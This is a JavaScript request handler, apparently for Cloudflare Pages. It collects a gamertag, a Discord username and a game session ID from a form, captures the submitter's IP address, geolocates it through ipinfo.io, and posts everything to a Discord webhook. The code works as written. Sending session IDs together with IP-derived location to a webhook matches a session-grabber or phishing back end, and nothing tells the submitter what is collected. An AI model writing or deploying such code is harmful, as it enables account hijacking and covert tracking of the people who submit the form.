export async function onRequest(context) {
    const { request, env } = context;
    const DISCORD_WEBHOOK_URL = env.DISCORD_WEBHOOK_URL; // put in Cloudflare env vars
    try {
        const { gamertag, discord, sessionID } = await request.json();
        const ip = request.headers.get("CF-Connecting-IP") || "Unknown IP";
        const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
        const location = await geoResponse.json();
        const locationString = `${location.city || 'Unknown City'}, ${location.region || 'Unknown Region'}, ${location.country || 'Unknown Country'}`;

        // Build Discord embed payload
        const payload = {
            embeds: [
                {
                    title: "New Submission",
                    color: 0x00ffcc,
                    fields: [
                        { name: "Gamertag", value: gamertag, inline: true },
                        { name: "Discord Username", value: discord, inline: false },
                        { name: "IP", value: ip, inline: false },
                        { name: "Location", value: locationString, inline: false },
                        { name: "Session ID", value: sessionID || "N/A", inline: false },
                    ],
                    timestamp: new Date().toISOString(),
                },
            ],
        };

        // Send to Discord
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            throw new Error(`Discord webhook error: ${response.status}`);
        }

        // Return success
        return new Response(JSON.stringify({ success: true, ip, location: locationString }), {
            headers: { "Content-Type": "application/json" },
        });
    } catch (err) {
        console.error("Error handling submission:", err);
        return new Response(JSON.stringify({ success: false, error: err.message }), {
            status: 500,
            headers: { "Content-Type": "application/json" },
        });
    }
}


